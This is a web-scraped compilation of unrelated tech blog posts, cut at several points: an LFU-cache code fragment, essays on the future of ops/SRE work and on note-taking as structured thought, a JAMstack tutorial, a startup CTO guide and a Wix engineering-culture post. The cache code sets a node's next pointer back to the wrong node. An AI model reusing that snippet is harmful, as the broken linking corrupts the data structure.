    frequency_node = value_node.freq_pointer

    
    
    
    next_frequency_node = frequency_node.next

    <span>if</span> next_frequency_node.freq != frequency_node.freq + <span>1</span>:
        
        new_frequency_node = make_frequency_node(frequency_node.freq + <span>1</span>)
        
        
        frequency_node.next = new_frequency_node
        new_frequency_node.prev = frequency_node

        next_frequency_node.prev = new_frequency_node
        new_frequency_node.next = frequency_node

        
        
        next_frequency_node = new_frequency_node

    
    next_frequency_node.values.add(value_node)
    
    
    value_node.freq_pointer = next_frequency_node
    value_node.next = <span>None</span>
    value_node.prev = next_frequency_node.values.last
    
    
    
    <span>if</span> len(frequency_node.values) == <span>0</span>:
        delete_frequency_node(frequency_node)

    
    <span>return</span> value_node.value
</code></pre>
<p>Again, since this operation also only deals with pointer manipulations through direct pointers, the running time complexity of this operation is also constant …</p></div></div></div>

			<p><span>Infrastructure, ops, devops, systems engineering, sysadmin, infraops, SRE, platform engineering. As long as I’ve been doing computers, these terms have been effectively synonymous. If I wanted to tell someone what my job was, I could throw out any one of them and expect to be understood.</span></p>
<p><span>Every tech company had a software engineering team that built software and an operations team that built infrastructure for running that software. At some point in the past decade they would have renamed this operations team to “devops” or “SRE”, but whatever the name, that was my team and those were my people.</span></p>
<p><span>But unless you’re an infrastructure company, infrastructure is not your mission. Which means that every second you devote to infrastructure work — and every engineer you devote to infrastructure problems — is a distraction from your core goals.&nbsp;</span></p>
<p><span>What’s more, it’s a distraction that builds on itself. The more time and energy you spend on infrastructure, the more your focus gets scattered, and the more you deprive yourself of the time and energy that ought to be devoted to the problems your business exists to solve.</span></p>
<p><span>This isn’t exactly new. Infrastructure and operations have always been a distraction from your core business problems. It used to be the case that every company had to grow internal expertise in hardware, datacenters, networking, operating systems, config management, and so on up the tech stack until reaching their core business problems. Infrastructure and ops have always been a distraction, but until recently, a necessary one. A means to an end.</span></p>
<p><span>So what’s changed? These days, you increasingly have a choice. Sure, you </span><i><span>can</span></i><span> build all that internal expertise, but every day more and more of it is being served up via API on a silver platter.</span></p>
<p><span>Does this mean that operations is no longer important, no longer necessary? Far from it. Operations and operability are more important than ever. Let’s take a look at what’s happening to the ops profession at a high level, the emerging challenges we face, and the impact this’ll all have on our careers.&nbsp;</span></p>
<h3><b>Changes afoot</b></h3>
<p><span>Beyond the broader move into to cloud services, here are some of the major shifts on our horizon.</span></p>
<h5><b>From monolith to microservices</b></h5>
<p><span>Much has been written about the operational demands of a microservices architecture. Now that functions calling other functions involves a network hop, operational concerns are an unavoidable part of debugging even the most trivial problems. Microservices change the game from “building code” to “building systems”, which pushes more and more code writing into the realm of operations.</span></p>
<h5><b>From monitoring to observability</b></h5>
<p><span>Metric-based tools like Prometheus and DataDog are infrastructure monitoring tools, and quite good ones at that. When you’re responsible for infrastructure, the questions you care about are of aggregates and trends, thresholds and capacity. Monitoring tools are the right tool for the job, because that’s how you understand whether your infrastructure is healthy, and what actions to take to make it or keep it healthy.</span><span><br>
</span><span><br>
</span><span>Observability tools*, on the other hand, are for the people writing and shipping code to users every day, and trying to inspect and understand behavior at the nexus of users, production, and code. Observability tools preserve the full context of the request. This allows you to slice and dice and tease out new correlations, as well as view events in a waterfall by time (“tracing”). Observability is how you connect the dots between software and real business impact, and between your engineers’ experience and your users’ experience. </span><span><br>
</span><span><br>
</span><i><span>*Caution: many monitoring tools are trying to rebrand themselves as observability tools without first building the necessary functionality. To tell the difference, </span></i><a href="https://www.honeycomb.io/blog/so-you-want-to-build-an-observability-tool/"><i><span>see here</span></i></a><i><span>.</span></i></p>
<h5><b>From magic autoinstrumentation to instrumenting with intent</b></h5>
<p><span>Instrumentation is just another form of commenting and documenting your code. There are tools that promise to do it automatically for you, but they aren’t great at capturing intent.. Auto-instrumentation can tell you loads of ancillary details, but they will </span><i><span>never</span></i><span> let you divine the business value intended by the engineer who built it. So suck it up and instrument your code.</span></p>
<h3><b>Ops is dead. Long live ops.</b></h3>
<p><span>Ops teams are going the way of the dodo bird, yet operability, resiliency, and reliability have never been more important. The role of operations engineers is changing fast, and the role is bifurcating along the question of infrastructure. In the future, people who would formerly have called themselves “operations engineers” (or devops engineers) will get to choose between a role that emphasizes </span><i><span>building infrastructure software as a service </span></i><span>and a role that uses their infrastructure expertise to help teams of engineers ship software more effectively and efficiently…generally by building as little infrastructure as possible.</span></p>
<p><span>If your heart truly beats for working on infrastructure problems, you’re in luck! — there are more of those than ever. Go join an infrastructure company. Try one of the many companies — AWS, Azure, all the many developer tooling companies — whose mission consists of building infrastructure software, of being the best in the world at infrastructure, and selling that expertise to other companies. There are roles for software engineers who enjoy building infrastructure solutions as a service, and there are even specialist ops roles for running and operating that infrastructure at scale, or administering those data services at scale.&nbsp;</span></p>
<p><span>Otherwise, embrace the fact that your job consists of </span><i><span>building systems to enable teams of engineers to ship software that creates core business value</span></i><span>, which means home brewing as little infrastructure as possible. And what’s left?</span></p>
<h5><b>Vendor engineering</b><span>&nbsp;</span></h5>
<p><span>Effectively outsourcing components of your infrastructure and weaving them together into a seamless whole involves a great deal of architectural skill and domain expertise. This skill set is both rare and incredibly undervalued, especially considering how pervasive the need for it is. Think about it. If you work at a large company, dealing with other internal teams should feel like dealing with vendors. And if you work at a small company, dealing with other vendors should feel like dealing with other teams.&nbsp;</span></p>
<p><span>Anyone who wants a long and vibrant career in SRE leadership would do well to invest some energy into areas like these:</span></p>
<ul>
<li><span>Learn to evaluate vendors and their products effectively. Ask piercing, probing questions to gauge compatibility and fit. Determine which areas of friction you can live with and which are dealbreakers.</span></li>
<li><span>Learn to calculate and quantify the cost of your and your team’s time and labor. Be ruthless about shedding as much labor as possible in order to focus on your core business.&nbsp;</span></li>
<li><span>Learn to manage the true cost of ownership, and to advocate and educate internally for the right solution, particularly by managing up to execs and finance folks.</span></li>
</ul>
<h5><b>Product engineering</b><span>&nbsp;</span></h5>
<p><span>One of the great tragedies of infrastructure is how thoroughly most of us managed to evade the past 20+ years of lessons in managing products and learning how to work with designers. It’s no wonder most infrastructure tools require endless laborious trainings and certifications. They simply weren’t built like modern products for humans.</span></p>
<ul>
<li><span>I recommend a crash course. Embed yourself within a B2B or B2C feature delivery team for a spell. Learn their rhythms, learn their language, soak up some of their instincts. You’ll need them to balance and blend your instincts for architectural correctness, scaling patterns, and firefighting.</span></li>
<li><span>You don’t have to become an expert in shipping features. But you should learn the elements of relationship-building the way a good product manager does. And you must learn enough about the product lifecycle that you can help debug and divert teams whose roadmaps are hopelessly intertwined and whose roadmaps are grinding to a halt.</span></li>
</ul>
<h5><b>Sociotechnical systems engineering</b><span>&nbsp;</span></h5>
<p><span>The irreducible core of the SRE/devops skill set increasingly revolves around crafting and curating efficient, effective sociotechnical feedback loops that enable and empower engineers to ship code — to move swiftly, with confidence. Your job is not to say “no” or throw up roadblocks, it’s to figure out how to help them get to yes.</span></p>
<ul>
<li><span>Start with embracing releases. Lean hard into the deploy pipeline. The safest diff is the smallest diff, and you should ship automatically and compulsively. Optimize tests, CI/CD, etc so that deploys happen automatically upon merge to main, so that a single mergeset gets deployed at a time, there are no human gates, and everything goes live automatically within a few minutes of a developer committing their code. This is your holy grail, and most teams are nowhere near there.</span></li>
<li><span>Design and optimize on-call rotations that load balance the effort fairly and sustainably, and won’t burn people out. Apply the appropriate amount of pressure on management to devote enough time to reliability and fixing things versus just shipping new features. Hook up the feedback loops so that the people who are getting alerted are the ones empowered and motivated to fix the problems that are paging them. Ideally, you should page the person who made the change, every time.</span></li>
<li><span>Foster a culture of ownership and accountability while promulgating blamelessness throughout the org. Welcome engineers into production, and help them navigate production waters happily and successfully.</span></li>
</ul>
<h5><b>Managing the portfolio of technical investments.</b></h5>
<ul>
<li><span>Operability is the longest term investment / primary source of technical debt, so no one is better positioned to help evaluate and amortize those risks than ops engineers. It is effectively free to write code, compared to the gargantuan resources it takes to run that code and tend to it over the years.</span></li>
<li><span>Get excellent at migrations. Leave no trailing, stale remnants of systems behind to support — those are a terrible drain on the team. Surface this energy drain to decision-makers instead of …</span></li></ul></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>When we write thoughts and ideas down with words for future recollection and synthesis, we take the stuff of abstract concepts, and collapse them down into a one-dimensional string of characters. For even the best, most careful writers, I think our ideas lose a lot of fidelity in this dramatic reduction in expressiveness of thoughts and their relationships to each other.</p>
<p>Our thoughts <em>in vivo</em> take on all kinds of shapes, and are connected in a myriad of relationships – by analogy, by example, by superset/subset relations, and so on. When we taxidermy them out onto paper or through the keyboard, we’re forced to flatten these relationships out onto a single dimension, usually nested bulleted links with verbal references  that leap across the page arbitrarily to connect related ideas to each other. Just think of the last time you jot down an idea in your note-taking method of choice – how much freedom did the medium afford you? At best, you’re writing freeform, pen-on-paper, and you draw arrows between related ideas and underline the important parts; typing on a keyboard into a text box is even more restrictive.</p>
<p>The internal structure of individual ideas vary even more greatly. Some thoughts contain lists of things, others are about comparisons between categories of things, and there are probably many more that can’t be named or enumerated or denoted with just a few lines going across the page between sentences. The state of the art in high-fidelity recording of our thoughts, in my opinion, is still handwriting on paper (or your digital handwriting app of choice). But here, we effectively lose our ability to search through information quickly, when we need it, because unlike bulleted lists, the information we hand-write isn’t <em>structured</em>.</p>
<p>This yields the question, <strong>how should we store and retrieve ideas in written form, so our workflows better preserve the living structure of thoughts?</strong></p>
<p>
<img src="https://thesephist.com/img/structured-thought.jpg" alt="Structured thought">
</p>
<p>I’ve previously noted <a href="https://linus.coffee/note/abstraction/">the parallelism and contrast between programming and written languages</a>. I think the more precise, multi-dimensional language of computers may be better suited for articulating relationships between our ideas in the written form.</p>
<h2 id="structured-thought">Structured thought</h2>
<p>Why might programming languages be better suited for recording relationships between ideas than the written word?</p>
<p>One reason is that programming languages are purpose-designed for building up living data structures. Programs, in their normal course of life, build up precise lists and trees and other complex structures of values. If there were a programming language as such, whose primitive values were units of thought or ideas instead of integers and strings and arrays, would we be able to record and retrieve our past ideas more effectively? In other words, what if there was some sort of a <a href="https://en.wikipedia.org/wiki/Domain-specific_language">domain-specific language</a> for better note-taking? Can we view the macro-structure of our thoughts as a highly specialized, highly complex data structure that we can encode into programs? Probably not entirely, but for the more analytical ideas, I think it’s a thought experiment we can entertain using new and interesting tools.</p>
<p>The most promising tool I’ve found exploring this direction is <a href="https://roamresearch.com/">Roam Research</a>. It stores ideas in a fluid, cross-linkable and searchable database of <a href="https://en.wikipedia.org/wiki/Hypertext">hypertext</a>. But Roam is still pretty restricted to nested relationships and bidirectional links between ideas (though I admittedly haven’t tried it in depth). I think there’s lots of headroom here in the market for exploring more general data structures for ideas, and for allowing note-takers to create their own structures and layouts.</p>
<h2 id="a-runtime-for-human-abstractions">A runtime for human abstractions</h2>
<p>I think an ideal future extension of this idea isn’t just a written format that can be queried like Roam or some kind of a programming language, but an omnipresent, ambient <a href="https://en.wikipedia.org/wiki/Runtime_system"><em>runtime</em></a> for our thoughts and ideas – one that can interact fluidly with our environment and context, and maybe even preempt our recollections and augment our ability to sift through our ideas from the past and present.</p>
<p>Sci-fi literature has imagined an endless taxonomy of ways for humans to externalize our minds onto offboard computers and networks of mechanical brains, most of which yield the control of our memory storage and recollection to some artificial and autonomous system. But I think there are ways to extend our minds using more primitive tools like better notes, and a more carefully crafted runtime for structured thought. One where we continue to drive interactions with our memory, albeit with more powerful tools in hand to record what we think, and remember them at the right times, when we need them.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Welcome to the second article of the series, <a target="_blank" href="https://hashnode.com/series/jamstack-for-all-cke19xxge004uvls1auha9inv">JAMstack for All</a>. I would like to thank you for your likes, comments and feedback on the <em><a target="_blank" href="https://blog.greenroots.info/jamstack-for-all-an-introduction-cke2fxc5800jvabs15lhn4a9x">JAMstack Introduction</a></em> article. </p>
<p>In this article, we will be diving into the JAMstack workflow with a side-by-side comparison of the traditional, monolithic workflow. We will also understand that, JAMstack and SPA(single page application) are not same. </p>
<p>I have introduced the phrase <code>prebuilt markup</code> to you in the introductory article. It is a very powerful concept and promises lots to perform. We will see how the pre-building is going to help us achieve an important pillar or user experience, i.e., <code>speed</code>.</p>

<p>If you haven't read the previous article of the series yet, you can find it here, <a target="_blank" href="https://blog.greenroots.info/jamstack-for-all-an-introduction-cke2fxc5800jvabs15lhn4a9x">JAMstack for All: An Introduction</a>. I would recommend you to read this for a better clarity on the history, what, why part of the JAMstack story.</p>
</blockquote>

<p>As per the report from <a target="_blank" href="https://wearesocial.com/blog/2020/01/digital-2020-3-8-billion-people-use-social-media">wearesocial.com</a>, roughly 53% of all web page requests come from mobile phones, computers account for 44% of the total. This report was published in January 2020 and it shows that, the mobile usage share is increasing steadily over the years.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598151207392/QBCjPko_Z.png?auto=format&amp;q=60" alt="we_are_social.png"></p>
<p>Just like myself, many of the mobile users are impatient. They do not like to wait longer for a page load, hate initial white screen or a loading indicator for long. Depending on the economy, place of living and earning, the types of mobile and the computation power differ. </p>
<p>There are still many users out there with single core mobile devices. There are users with high end mobiles with great hardware support. However speed is one of the  common needs for both the user classes. Do you know what? The users with high end mobile devices are more impatient than others, as they are used to the <code>fast</code> environment so much.</p>
<p>As an application developer, we need to count this important user expectation and design the experience accordingly. We need to make sure, the page loads faster. We must get users the required initial bytes of page information as soon as possible to reduce a <code>cold start</code>.</p>

<p>One of the characteristics of JAMstack is the markup should be <code>prebuilt</code>. It means, we as developers can spend a few extra seconds in the build phase of an application than, expecting a customer to get frustrated by burning those extra seconds at the run time. Our customers wouldn't care at all, if we spend the extra time in building the application.</p>
<p>A typical user mindset for an application load where lots are happening in the browser (screen-shot from <em>Matt Biilmann's JAMstack at Scale: why pre-built markup is critical</em> presentation):</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598152532147/lthwdAoKm.png?auto=format&amp;q=60" alt="image.png"></p>
<p>A great amount of time goes in the initial load itself and it leads your users to bounce off the application or website easily. There is also a problem of not meeting user's expectation about the design. What if the users are not finding it useful and we have to rollback to the old state? Some production nightmares, isn't it?</p>
<p>With the <code>prebuilt</code> approach of JAMstack, we solve this to a great extent. All the required JavaScript along with the markup and styles are already built and served from a content delivery network(CDN). There is no waiting at the browser's runtime about what script and, which page to load.</p>
<p>The heavy lifting is done at once at the build time, which takes the processing time out of the request and eventually uses less computation at the run time.</p>
<p>The sections below show the difference in the build vs load time between the server rendered, SPA and JAMstack applications.</p>
<h3 id="server-rendered">Server Rendered</h3>
<p>In a server rendered application, all the heavy lifting is done by the server. The browser needs to request for a page and the server computes, generates the page. Once done, it sends the page to the browser as part of the response. The browser downloads the page and renders. This cycle repeats for each of the page loads and all happen over the wires all the times.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598153515145/fBxG_mmmm.png?auto=format&amp;q=60" alt="image.png"></p>
<h3 id="single-page-applicationspa">Single Page Application(SPA)</h3>
<p>A single page application solves the above problem greatly. The server doesn't handle the page computations, routing and request based serving. But the problem is, lots are happening on the client side. We are relying on the browser and the device power here for all the computations at the run time.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598153551324/KWbNo82Xv.png?auto=format&amp;q=60" alt="image.png"></p>
<h3 id="jamstack">JAMstack</h3>
<p>With JAMstack's <code>prebuilt</code> mechanism, the content is already built. As the content was already built, there is no need for an origin server at all. The content can be served from a CDN. It solves both the problems we have seen with the <code>server rendered</code> apps and <code>SPA</code>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598153586296/GxJuCLbu3.png?auto=format&amp;q=60" alt="image.png"></p>
<p>There are several advantages of pre-building the content,</p>
<ul>
<li>Transpile JavaScript and build with markup and style.</li>
<li>Pull data from remote services.</li>
<li>Build C into WebAssembly.</li>
<li>Lint your code for accessibility (<code>Netlify</code> has introduced the build time plug-in system, will see it in the future article of the series).</li>
<li>Shaping up the data that are required by the UI component at the build time.</li>
</ul>
<p>How about the rollback issue we spoke above? We will learn about it shortly.</p>

<p>As we know about the benefit of pre-building the app now, we need to talk a bit about CDN, i.e, content delivery network. There is actually not much advantage, if a prebuilt mark up is served from an origin server. It will be almost similar to the server rendered applications.</p>
<p>Let us take an example. Assume that, an application content is being served from the origin server, <code>abcd.com</code> which is located in some part of the USA. A user like me who is from India wants to access a page from <code>abcd.com</code>. It may be a poor experience for me to render this page on my browser depending on my network speed, hardware capabilities, distance between my browser and the origin server etc. </p>
<p>How about, I have the page(or the content) hosted in my proximity in a secured manner? This where the CDN comes in. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598174766656/DnE3Lu5IT.png?auto=format&amp;q=60" alt="CDN.png"></p>
<ul>
<li>CDN reduces the distance between the users and the website resources.</li>
<li>CDN reduces the amount of data to be transferred using minification techniques.</li>
<li>Helps in cache invalidation so that, users do not see the stale data.</li>
<li>It is secured.</li>
</ul>

<p>I am sure, we have a good ground on the <code>prebuilt</code> content and <code>CDN</code> by now. With that, let us understand some critical differences between a traditional workflow and JAMstack workflow.</p>
<h3 id="traditional-workflow">Traditional workflow</h3>
<p>In a traditional client-server workflow,</p>
<ul>
<li>Developers write code, test, build the <code>application</code>.</li>
<li>Ships the <code>application</code> to a server(<code>origin server</code>).</li>
<li>Users request a resource from the <code>origin sever</code> specifying a URL.</li>
<li>The origin server does the computations, produces the <code>required HTML</code> and send to the user. When the user requests a new resource, the process continues.</li>
</ul>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598175113805/9Mo0SqrFv.png?auto=format&amp;q=60" alt="Traditional.png"></p>
<h3 id="jamstack-workflow">JAMstack workflow</h3>
<p>In JAMstack workflow,</p>
<ul>
<li>Developers write code and push to a <code>source repository</code> like git.</li>
<li>A <code>workflow</code> kicks off which start the build to create <code>prebuilt content</code>.</li>
<li>The prebuilt content then gets deployed to a <code>CDN</code>.</li>
<li>Users request for the resources from the <code>CDN</code>(available in proximity) and the prebuilt content is served. No need to reach out to the origin server.</li>
</ul>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598175378452/lZL0CT9px.png?auto=format&amp;q=60" alt="JAMstackflow.png"></p>
<p>It is also easy to manage customer expectations with JAMstack. The process of reverting a fix or rolling back to a specific state of the application with the traditional approach is difficult. It requires the process to plan a release, on board developers, tester, devops. Build the entire application again and then finally ship it to the server.</p>
<p>With JAMstack, the workflow is managed very easily. Here is an example from <a target="_blank" href="https://www.netlify.com/">Netlify</a> where all my branch deploys are available for me to make an easy switch and serve the application from it with a single click. We will learn about this workflow in details later in the series.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598175471575/qtBQcZxhl.png?auto=format&amp;q=60" alt="image.png"></p>

<ul>

</ul>

<p>Great, so we know all about JAMstck and the fundamentals of it. Hope it was useful to you. In the next article, we will see the usage of Static Site Generators(SSG) and Headless CMS together. </p>
<p>We will go through the step-by-step way to build a JAMstack application using gatsbyjs, tie it with the git workflow and then deploy it with netlify. We will also learn to manage the content of our app using a CMS. It is going to be a fun learning with all the concepts we have got so far. Stay tuned!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><span><p>The new buzz word in town is the term CTO. As all industries start to embrace technology as part of the core business, the person incharge of this technology will then start to grow in its important. Do you then know what does the role of a CTO entails? Beyond the glamorous term comes with a ton of responsibilities that is paramount for the development of the company across its stages. If you ever inspires to be a CTO yourself someday, this article is for you.</p>
<br>

<p>We will be going through these sections:</p>

<p>What does CTO do across stages of a startup</p>
</li>
<li>
<p>Challenges</p>
</li>

<br>
<h2>What does CTO do across stages of a startup</h2>
<br>
<h3>1. Pre-seed stage</h3>

<p>Here you have 0 - 1 developer to basically kick start your entire idea. From git repo initilisation to actually be able to see a UI. Here is where your pre-seed stage will be.</p>
<br>
<ul>
<li>Building the MVP</li>
</ul>

<p>Startup CTOs should be well versed in the tools and technologies available for building MVPs, whether those be web apps, mobile apps, desktop software. They cannot be afraid to get their hands dirty because even if there is a budget to hire a team, the CTO plays backup for any roles that cannot be immediately filled.</p>

<p>You need to create this MVP that can be able to gain real-time user feedback as fast as possible.</p>
<br>
<h3>2. Early startup</h3>

<p>You actually have some intermittent market feedback of a market fit and now you are looking to ramp up your development work. Here, you will look to have 1 - 10 engineers to kick start your development process. I’ve come to believe that different companies sits in this stage for various durations. The size of the engineering team should only appropriately grow in proportion with the performance and traction of the product or service. You do not want to find yourself to be in a situation where you are mass-hiring but each engineers are actually relatively unproductive. You should only ramp up the size of the engineering when you have processes in place to better manage these additional manpower. Truly, many cooks spoil the broth. Listed below are some of the scope of a CTO in the early start phase:</p>
<br>
<ul>
<li>Hiring engineers, IT professionals, and data scientists.</li>
</ul>

<p>Finding and bringing on engineering talent is one of the hardest things for tech startups to do. Hiring for cultural fit at a small startup is challenging. Many developers want to specialize while startups demand generalists.</p>

<p>CTO at a startup has to be good at hiring, onboarding, training, and eventually replacing the company’s technical staffs. Having a proven hiring process and strong network will help.</p>
<br>
<ul>
<li>Figuring out company-wide security</li>
</ul>

<p>When no security policy was done before, it falls onto the lap of CTOs to own the security component, run audits, document security procedures, and train everyone on the basis of it.</p>

<p>Simple security includes a VPN to protect your servers &amp; database from public access.</p>
<br>
<ul>
<li>Product management</li>
</ul>

<p>While the CTOs primary goal is to make the vision of the non-technical product manager a reality, it also means that they have to manage the flow of work into the engineering team. Often times, CTOs take an active role in laying out the product planning process. It is common for startup CTOs to learn both product and technology. Its challenging but learning new things is the norm at startups.</p>
<br>
<ul>
<li>Clear technical debts<br>
A good startup CTO will recognize when poor architecture is slowing down the team, and will step in to settle these technical debts when needed. Eventually these architecture clean ups may be delegated to senior engineers, but it will be likely to fall onto the CTO once in a while.</li>
</ul>
<br>
<ul>
<li>Bug triage</li>
</ul>

<p>First without a Quality Assurance team, it falls onto the CTO to triage bugs, replicate and document down the behavior of the feature, then distribute these bugs to the team for a fix. Deciding how to debug an issue requires detailed understanding of the implementation.</p>
<br>
<ul>
<li>QA and testing</li>
</ul>

<p>Without a proper initial team of quality assurance engineers, the testing layer falls onto the responsibility of the engineering team, headed by the CTO. Planning out the testing layers requires hands-on, hands dirty experiments.</p>
<p>Attached is an article on how to create your testing layer in your company. Check it out <a ref="nofollow" target="_blank" href="https://www.karllhughes.com/posts/testing-layers">here</a>.</p>
<br>
<ul>
<li>DevOps</li>
</ul>

<p>Your servers are your digital assets, and until a DevOps engineer is hired to manage these assets, it will too fall onto the CTO to manage them during the interim period.</p>
<br>
<h3>3. Growth</h3>

<p>Here the company has been gaining traction and is now looking to grow the team from 10 - 100 engineers. The company’s product is starting to mature and people are looking to settle into your company as a possible career-long alternative. In here, then you have to focus on ensuring employee retention and a healthy career progression for each of your employees.</p>
<br>
<ul>
<li>Vendor and customer relationship</li>
</ul>

<p>The CTO has to be clear to figure out what is needed to be done to streamline the company’s technical cost. It could be for the developers processes, or the company’s process through technology.<br>
This is essential if the product is starting to integrate with other softwares or has its own API. The external technical relationships will be the responsibility of the CTO. This is essential if we have power users whom are integrating with us, requesting for some ‘must-have’ features.</p>
<br>
<ul>
<li>Team growth management</li>
</ul>

<p>Managing a team of 5 is different from managing a team of 100. Once the company expands and grow, you will start to hire more specialised engineers which isn’t looking for exciting and challenging tasks. Their focus will just be the traditional benefits, vacation days, and a structured career ladder. The ability to develop the skillset to manage the startup across different life stages will also be the challenge the CTO has to undergo.</p>
<br>
<ul>
<li>Employee retention</li>
</ul>

<p>The early employees whom joined for the challenges may consider other options as the startup phases into a mid-sized startup. As tech workers has plenty of options, its rare to keep one for more than 2, 3 years. The CTO that moves the company across phases has to learn how to retain their employees with strong alignment to the worker’s personal goals.</p>
<br>
<h3>4. Expansion</h3>

<p>Generally, once you are in the phase of expansion, you have to be laser focused to get your technology vision and mission in your company. This does not imply that your company has to utilize the latest technology all the time. Fundamentally, what is your company’s vision and problem statement? Focus on that, and ensure that we are using the best technology available out there to achieve this goal.</p>

<p><img src="https://www.dropbox.com/s/q9pg24tufqwzoog/expansion.png?raw=1" alt=""></p>
<br>
<hr>
<br>
<h2>Challenges</h2>

<p>The challenges a CTO face will be endless. Even as a developer, the amount of challenges you face are endless and everyday you have a ton of todos and blockers to clear. More specifically for CTOs, just as I was reading up on the this aspect, the key challenges faced by all CTOs are primarily hiring and alignment with business people.</p>
<br>
<h3>1. Hiring</h3>

<p>Good engineers that can help you to marry business and technology are hard to find. It will be all the more in demand in times when the world is embracing digital transformation. Even investors are willing to put their millions into savings plans through video calls. It is key to hire not just gifted engineers but those whom will also help shape the culture of the business.</p>
<br>
<h3>2. Focusing on customer engagement</h3>

<p>If you want to create a good technology, it is only just as good as whom the technology is created for. You may create the world’s first robotic arm for minimally invasive surgery but if i’m only washing dishes, why would that be of value to me? You have to benchmark the quality of your product to the utility of your target audience. They have the valuable feedback. In a world where there is a imperfect information, one can only move in the most informed decision; but always with a certain level of uncertainty and risk. Continuously engage with your ‘customers’ and find out what will empower them and set them up to do more with less using your product.</p>
<br>
<hr>
<br>
<h2>5 Key learning opportunities</h2>

<p>Not everyone is born ready for such a big role. It will stretch you, ‘forces’ you to rise up to the occasion and you may even be surprised by what you are able to achieve when you’re placed under the pressurized cooker of your business demands. Generally, CTO is a leadership role. As glamorous as it may sound, it is still in essence just a role. What is most important is the being that is placed in that role. Are you developing yourself to face the bigger problems that are before you?</p>
<br>
<ol>
<li>
<p>Technical knowledge</p>
</li>
<li>
<p>Technical leadership and strategy planning</p>
</li>
<li>
<p>Communication and Mentoring</p>
</li>
<li>
<p>Project management and Operational excellence</p>
</li>
<li>
<p>Sense of entrepreneurship and anticipation of the future</p>
</li>
</ol>

<p>What better way to find out your key areas of learning opportunities than to hear from founders themselves. Here’s a video that To sum this part up</p>

<br>
<h2>TLDR;</h2>

<p>The end goal, the article gives a in-depth glimpse into the scope of a CTO’s day to day. How then can one possibly keep up with this pace of work? Only if you have a clear vision of the possible future. Technology is no longer just a tool for your Business-as-usual. It could possibly shape your future and redesign how life could be, should be, and will be.</p>

<p>From here on, I wish to share with you all a really cool podcast called <a ref="nofollow" target="_blank" href="https://moderncto.io/">Modern CTO</a>. It is a podcast whom CTOs of all different companies will share some of their thoughts, journey, and learnings as CTOs. One thing is common: their level of curiosity for the world around them. Whatever role you are to play, stay curious and be a future explorer!</p>

With over 20 years experience in Engineering management and VP R&amp;D roles in various startups and enterprise size organizations I can fully appreciate Wix’s unique investment in engineering and want to share some of the recipe for our secret sauce with you.</span></p><p id="viewer-12mhu"><span>I will not cover all of our engineering practices, since there are too many to fit in a blog post and since they are continually changing and evolving to adapt to our growth and needs.</span></p><p id="viewer-6dr1b">
<span>Instead, I want to focus on our unique formula for investing 20% of our engineering time in professional and community growth.</span></p><p id="viewer-27pfs"><span>Wix is an engineering-focused company: our founders are engineers and about 50% of Wix’s staff is R&amp;D. Since engineering is the heart and soul of Wix (as well as most of our muscle and brain power), we significantly invest in keeping our engineering in best shape by allocating 20% of every developer’s time to enhance their software engineering skills and build a strong, innovative and collaborative engineering community both within and outside of Wix.</span></p><p id="viewer-46gmb"><span>Can you imagine having 1 day a week, every week, allocated to growing your engineering skills?

How do we invest this valuable time?</strong></span></p><p id="viewer-ff74u"><span>Every Thursday, all engineers per site and profession (e.g. Server, Front End, Mobile, Data science, and QA) meet for half a day of training, knowledge sharing and community building activities.</span></p><p id="viewer-sfo"><span>If we zoom into the server guild, for example (which happens to be the guild I head), every guild day is different, but will typically include:</span></p><p id="viewer-70un7"><span>Project spotlights, where developers share their recent projects, product, architecture and/or technologies they worked with, and challenges they faced, and talk about the lessons they learned.</span></p><p id="viewer-6patl"><span>Themed training: every 3–6 months we select engineering topics we’d like to focus on. For example, in 2019 we picked Performance, API first, JVM Internals, and TDD.

You do not necessarily need to be an expert in a specific subject, you just need to be passionate about learning and sharing the knowledge you gained.</span></p><p id="viewer-f3m6v"><span>This is where <strong>Tracks come in</strong>: these are typically an hour and a half long events where we have dozens of different activities you can choose from. Typically, in every guild day you get to select one of 4 different track options. A few examples of the variety of our tracks:</span></p><ul><li id="viewer-a3f9k"><p>Mob programming (pair programming on steroids) — this is when you get to code in a group of fellow devs and get to share and learn coding standards, refactoring practices, Intellij tricks and incremental thinking. And come out with a working program. </p></li><li id="viewer-67g41"><p>Design track — where you share a design dilemma (typically one you’ve faced and solved for one of your products) and do a group design for it, discuss considerations, debate on tradeoffs, provide new perspectives and reach suggested design alternatives. </p></li><li id="viewer-n1h8"><p>Town Halls — these are mini unconferences where you can raise any issue / dilemma on your mind. Examples include talking about Mocks vs Stubs and working through questions like “how do I effectively estimate my tasks?” or  “how should we effectively enforce deprecations?”. We also hold group discussions to hear other people’s experiences and insights. Town halls will often suggest guidelines or areas to be addressed by the guild. </p></li><li id="viewer-44t34"><p>Building your professional brand track — where you get to invest and consult on your brand presence — this is a sounding board for your next idea for a tech talk or a blog post. This is where you get feedback from other engineers to help you shape your idea into reality and get more tips on how to grow your engineering brand presence. </p></li><li id="viewer-3vkln"><p>Learn a new coding language — where you get to learn (group-guided or self-guided) together. We had Node, Python, GO, Haskell, and more to come. </p></li><li id="viewer-3629s"><p>Pairing &amp; sharing — where you pair with a developer who’s not in your team and share a recent dilemma or a recent project and either do mutual code review, design brainstorming, or prepare for post mortems. The point is to both gain and provide fresh perspective on your day-to-day dilemmas.</p></li></ul><p id="viewer-5kp3m">And since tracks change on a weekly basis — so much more, any dream you have on something you’d like to learn and practice together — easily becomes a track.</p><p id="viewer-27h86"><span>Every quarter you get to have a guild week. This is a week away from your team — where you get to pair with engineers who are not in your group and work together on tasks and initiatives outside your regular backlog.</span></p><p id="viewer-3mvq4"><span>You can pick a guild week track and here are a few examples for popular tracks:</span></p><p id="viewer-fum50"><span><strong>Infrastructure track</strong> — where you get to contribute and build the next generation of Wix 